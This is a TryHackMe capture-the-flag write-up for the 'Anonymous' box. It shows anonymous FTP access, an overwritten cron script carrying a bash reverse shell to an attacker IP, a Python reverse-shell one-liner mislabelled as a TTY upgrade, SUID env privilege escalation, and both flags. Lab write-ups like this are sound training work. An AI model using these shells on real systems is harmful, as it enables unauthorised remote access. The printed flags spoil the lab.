# TryHackMe Write-Up: Anonymous

| Field      | Details          |
|------------|-------------------|
| Platform   | TryHackMe         |
| Difficulty | Easy              |
| OS         | Linux             |
| Author     | shreekara         |
| Date       | October 29, 2025  |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — Anonymous FTP](#2-enumeration--anonymous-ftp)
3. [Initial Access — Writable `clean.sh`](#3-initial-access--writable-cleansh)
4. [User Flag](#4-user-flag)
5. [Privilege Escalation — SUID `env`](#5-privilege-escalation--suid-env)
6. [Summary & Takeaways](#6-summary--takeaways)

---

## 1. Reconnaissance

Started with a full port scan:

```bash
nmap -sC -sV 10.10.40.150
```

Four ports came back:

| Port | Service | Details |
|---|---|---|
| 21 | FTP | vsftpd 2.0.8 or later |
| 22 | SSH | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 139 | SMB | Samba smbd 3.X - 4.X |
| 445 | SMB | Samba smbd 3.X - 4.X |

I also ran the target through the port scanner I've been building myself (`main.py`, a lightweight nmap/zenmap-style tool in Python) to cross-check the nmap results against my own code:

<img width="1906" height="1061" alt="Screenshot 2025-10-28 231821" src="https://github.com/user-attachments/assets/7cdcf81a-d036-4a29-928f-2a84e2e41cc4" />

```text
Network Scanner v1.0
Similar to nmap/zenmap

[*] Starting scan on target: 10.10.40.150
[*] Port range: 1-1000
[*] Threads: 100
[*] Timeout: 1.0s
[*] Directory enumeration: Disabled

[*] Scanning 1000 ports ...
[+] Port 21 is OPEN
[+] Port 22 is OPEN
[+] Port 139 is OPEN
[+] Port 445 is OPEN

SCAN RESULTS
Target: 10.10.40.150
Duration: 1.91s
[+] Open Ports (4): 21, 22, 139, 445
```

Matched nmap's findings exactly — good validation for the tool. Small attack surface overall, and SSH is a dead end without creds, so FTP was the obvious next stop — anonymous login is always worth trying when port 21 is open.

---

## 2. Enumeration — Anonymous FTP

```bash
ftp 10.10.40.150
```
<img width="922" height="512" alt="image" src="https://github.com/user-attachments/assets/3cccd8de-6786-420e-bfd7-8f8081886f34" />

```text
Connected to 10.10.40.150.
220 NamelessOne's FTP Server!
Name (10.10.40.150:sneaky69): anonymous
331 Please specify the password.
Password:
230 Login successful.
```

Anonymous login worked immediately. Listing the root directory turned up one folder:

```text
drwxrwxrwx    2 111 113 4096 Jun 04 2020 scripts
```

World-writable — always worth a closer look. Inside `scripts`:

```text
ftp> cd scripts
ftp> ls
-rwxr-xrwx  1 1000 1000   314 Jun 04 2020 clean.sh
-rw-rw-r--  1 1000 1000  2107 Oct 28 18:11 removed_files.log
-rw-r--r--  1 1000 1000    68 May 12 2020 to_do.txt
```

`clean.sh` has the `w` bit set for everyone. What stood out more, though, was `removed_files.log` — every other file in the directory is stamped 2020, but this one has a fresh timestamp. That means something is actively running and appending to it on a schedule, almost certainly a cron job executing `clean.sh`. If I can overwrite that script, whatever's triggering it runs my code too.

---

## 3. Initial Access — Writable `clean.sh`

Swapped the script for a reverse shell one-liner pointed at my Kali box:

```bash
#!/bin/bash
bash -i >& /dev/tcp/10.11.151.182/1234 0>&1
```

Uploaded it over FTP:

```text
ftp> put clean.sh
local: clean.sh remote: clean.sh
226 Transfer complete.
228 bytes sent
```

Set up a listener and waited for the cron job to fire:

```bash
nc -nlvp 1234
```

<img width="1915" height="993" alt="image" src="https://github.com/user-attachments/assets/883c369c-2f39-43c1-a774-2459672ebb94" />

```text
listening on [any] 1234 ...
connect to [10.11.151.182] from (UNKNOWN) [10.10.40.150] 41040
/bin/sh: 0: can't access tty; job control turned off
$ pwd
/home/namelessone
```

Shell landed as `namelessone`. Upgraded it to a proper TTY with the usual python pty trick so I wasn't fighting a dumb shell for the rest of the box:

```bash
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.11.151.182",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

---

## 4. User Flag

```bash
ls
```

```text
pics
user.txt
```

```bash
cat user.txt
```

```text
90d6f992585815ff991e68748c414740
```

---

## 5. Privilege Escalation — SUID `env`

Standard next move on any freshly landed shell — hunt for SUID binaries owned by root:

```bash
find / -user root -perm -u=s 2>/dev/null
```

`/usr/bin/env` came back in the list. GTFOBins confirms it's exploitable: `env` doesn't drop elevated privileges when it execs another program, so if it's SUID root, it can be used to spawn a shell that inherits that privilege.

```bash
/usr/bin/env /bin/sh -p
```

<img width="1132" height="828" alt="image" src="https://github.com/user-attachments/assets/44103325-1ba8-44ff-86a3-6253b7875050" />

```text
$ /usr/bin/env /bin/sh -p
whoami
root
```

Root.

```bash
cat /root/root.txt
```

```text
4d930091c31a622a7ed10f27999af363
```

---

## 6. Summary & Takeaways

### Attack Chain

| Phase | Technique | Result |
|---|---|---|
| Recon | Nmap + custom Python scanner | Ports 21, 22, 139, 445 identified |
| Enumeration | Anonymous FTP login | Access to FTP server |
| File Enumeration | `/scripts/` directory | Writable `clean.sh` found; fresh log timestamp pointed to an active cron job |
| Initial Access | Malicious `clean.sh` via FTP upload | Reverse shell as `namelessone` |
| User Flag | `cat user.txt` | User flag captured |
| Privilege Escalation | SUID enumeration → `/usr/bin/env` | `env /bin/sh -p` → root shell |
| Root Flag | `cat /root/root.txt` | Root flag captured |

### What I Took Away From This Box

**Don't fixate on SSH just because it's open.** FTP with anonymous access enabled was the entire way in here. Always check it when port 21 is exposed, even if it looks like the least interesting service on the scan.

**A stale-looking directory can still have a live process behind it.** Every file in `scripts/` was timestamped 2020 except one — that one inconsistency was the signal that something was still actively running against the folder, which turned a "maybe" into a confirmed attack path.

**World-writable + actively executed = code execution.** The moment a writable file is confirmed to be running on a schedule, it stops being a misconfiguration and becomes a shell.

**Shell access isn't the finish line.** SUID enumeration should be one of the first things run after landing on a box, not an afterthought — `env` being SUID root here was a direct, one-command route to full compromise.

---

## Flags

**User:** `90d6f992585815ff991e68748c414740`
**Root:** `4d930091c31a622a7ed10f27999af363`
